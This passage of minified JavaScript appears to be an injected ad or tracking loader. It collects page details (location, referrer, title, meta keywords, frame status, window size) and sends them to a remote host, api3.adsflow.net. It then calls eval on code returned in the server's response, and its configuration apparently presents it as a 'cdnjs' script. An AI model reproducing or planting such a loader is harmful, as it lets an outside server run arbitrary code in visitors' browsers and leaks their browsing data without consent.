...
b=document.querySelectorAll("meta"),k=[],f=0;f<b.length;f++)"keywords"==b[f].name.toLowerCase()&&k.push(b[f].content);req={width:h,height:e,frame:d!=d.top,location:a.location.toString(),referer:a.referrer,title:a.title,keywords:k.join(", "),loader:m};a.gotowf||(a.gotowf=!0,ajax(l,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(d){console.log(d)}}))}a.body?g():a.addEventListener("DOMContentLoaded",g)})(window,document,"//api3.adsflow.net/post",{"name":"cdnjs","time":1467444974.517,"user":"1057494.11510751","subid":1057494,"geo":"NP","cert_domain":"un-stop.info","hash":"de4c3495bec3f516b0da41cfb86d0291"});